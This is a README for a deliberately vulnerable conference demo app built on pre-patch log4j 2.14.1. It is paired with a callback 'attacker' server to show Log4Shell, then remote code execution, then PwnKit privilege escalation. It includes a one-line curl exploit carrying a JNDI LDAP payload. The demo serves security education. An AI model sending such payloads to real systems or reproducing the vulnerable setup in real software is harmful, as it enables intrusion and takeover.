# 🔓 Vulnerable Application — Old Java (Live Exploit Demo)

> **⚠️ FOR CONFERENCE DEMO PURPOSES ONLY — DO NOT DEPLOY TO PRODUCTION ⚠️**

Same `HelloConference` app as [`Vulnerable Application/`](../Vulnerable%20Application), but
built and run on an intentionally **old** Java 17 / Spring Boot 2.7 stack with
`log4j-core 2.14.1` (pre-patch) so the JNDI lookup actually fires — unlike the Java 25
build next door, which blocks it by default. Paired with [`Callback Server/`](../Callback%20Server)
(the "attacker's" LDAP + HTTP server), it drives a live, end-to-end exploit chain:
Log4Shell → RCE → PwnKit privilege escalation.

This pairing is what `.github/workflows/demo-vulnerable-app.yml` runs on every push,
publishing a full command-by-command, machine-by-machine transcript to
[GitHub Pages → /vulnerable](https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/).
See that workflow for the canonical, always-current walkthrough — the summary below is
for running it by hand.

## Three images, same JAR

| Image | Dockerfile | User | Base | Packages |
|-------|-----------|------|------|----------|
| `vuln-app:root` | `Dockerfile.root` | `root` | temurin:11-jre-jammy | gcc, curl, wget, netcat, sudo, policykit-1 |
| `vuln-app:escalation` | `Dockerfile.escalation` | `appuser` (uid 1000) | temurin:11-jre-jammy | gcc, curl, netcat, policykit-1 |
| `vuln-app:safe` | `Dockerfile.nonroot` | `ubuntu` (uid 1000) | temurin:25-jre | none |

## Run it locally

```bash
# Everything (3 app variants + callback/attacker server):
docker compose up

# Or just the combination you want to demo:
docker compose up vuln-root callback        # root image, port 8080
docker compose up vuln-escalation callback  # non-root + PwnKit, port 8081
docker compose up vuln-safe callback        # minimal secure image, port 8082
```

Callback server dashboard: http://localhost:9999/dashboard/live

```bash
# The exploit — one curl request:
curl "http://localhost:8080/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"
```

See [`Callback Server/README.md`](../Callback%20Server/README.md) for the full attack chain,
ports, and endpoints.

## Cleanup

```bash
docker compose down --rmi all
```
